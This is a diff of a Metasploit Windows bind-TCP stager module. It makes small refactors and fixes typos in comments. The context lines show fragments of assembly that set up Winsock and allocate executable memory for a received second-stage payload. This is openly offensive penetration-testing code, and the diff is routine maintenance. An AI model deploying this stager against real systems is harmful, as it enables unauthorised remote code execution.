@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-
 module Msf
 
 
@@ -27,14 +21,14 @@ module Payload::Windows::BindTcp
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:     datastore['LPORT'],
       reliable: false
     }
 
     # Generate the more advanced stager if we have the space
-    if self.available_space && required_space <= self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -132,7 +126,7 @@ module Payload::Windows::BindTcp
 
         mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
         sub esp, eax           ; alloc some space for the WSAData structure
-        push esp               ; push a pointer to this stuct
+        push esp               ; push a pointer to this struct
         push eax               ; push the wVersionRequested parameter
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp               ; WSAStartup( 0x0190, &WSAData );
@@ -227,7 +221,7 @@ module Payload::Windows::BindTcp
         mov esi, [esi]         ; dereference the pointer to the second stage length
         push 0x40              ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
-        push esi               ; push the newly recieved second stage length.
+        push esi               ; push the newly received second stage length.
         push 0                 ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
